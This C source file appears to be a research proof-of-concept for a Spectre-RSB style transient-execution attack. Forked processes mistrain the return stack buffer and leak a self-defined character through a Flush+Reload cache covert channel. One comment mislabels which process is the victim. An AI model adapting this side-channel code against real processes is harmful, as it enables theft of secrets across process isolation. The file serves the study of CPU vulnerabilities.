#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

#include "libcache/cacheutils.h"

#define SECRET 'S'

char secret;
pid_t is_child;

void __attribute__((noinline)) in_place() {
  // We let the child (victim) sleep for a shorter period of time
  // Therefore, the victim should pop the attackers return address from the RSB
	if(is_child)
		usleep(500);
	else
		usleep(50);
	return;
}

void __attribute__((noinline)) attacker() {
	while(1) {
		in_place();
    // Encode data in cache
    // Victim is supposed to return
		cache_encode(secret);
	}
  return;
}

void __attribute__((noinline)) victim() {
  while(1) {
    // Flush our shared memory
    flush_shared_memory();
    mfence();
    
    // Put to sleep and return transiently to wrong address before returning here
    in_place();
    
    // Recover data from the covert channel
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255;
      if(flush_reload(mem + mix_i * pagesize)) {
        if(mix_i != '.') {
          printf("%c   ", mix_i);
          fflush(stdout);
        }
      }
    }
  }
}

int main(int argc, char **argv) {
  // Detect cache threshold
  if (!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  pagesize = sysconf(_SC_PAGESIZE);
  char *_mem = malloc(pagesize * (256 + 4));
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  memset(mem, 0, pagesize * 256);

  // OOP attack, so fork
  is_child  = fork() == 0;

  // Attacker always encodes a dot in the cache
  if(is_child) {
    secret = '.';
	  attacker();
	} else {
    secret = SECRET;
	  victim();
	}
}
